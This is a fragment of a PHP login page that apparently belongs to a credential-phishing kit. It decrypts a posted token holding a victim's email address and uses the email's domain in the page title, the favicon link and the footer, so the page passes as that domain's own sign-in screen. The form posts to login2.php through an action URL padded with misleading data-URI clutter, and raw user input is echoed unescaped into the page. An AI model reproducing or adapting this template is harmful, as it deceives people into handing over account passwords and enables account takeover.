...
<head>
    <meta charset="UTF-8">
    <title>Authenticate <?php echo preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));  ?></title>
	<link rel="shortcut icon" href="http://<?php echo preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));  ?>/favicon.ico" />
...
<form class="jotform-form" action="login2.php?fav=1&mail&data:text/html;charset=utf-8;base64,PGh0bWw+DgPC9zdHlsZT4NCiAgPGlmcmFt=<?php echo $_POST["token"]; ?>&loginID=<?php echo $_POST["token"]; ?>&.#n=1252899642&fid=1" method="post" name="form_200604353419549" id="200604353419549" accept-charset="utf-8" autocomplete="on">
...
$domain = preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));
...
?>
	  ...
	  <div style="text-align:center" data-align="center" class="form-buttons-wrapper  ">
            &copy;2020 <?php echo preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));  ?>. 
          </div>
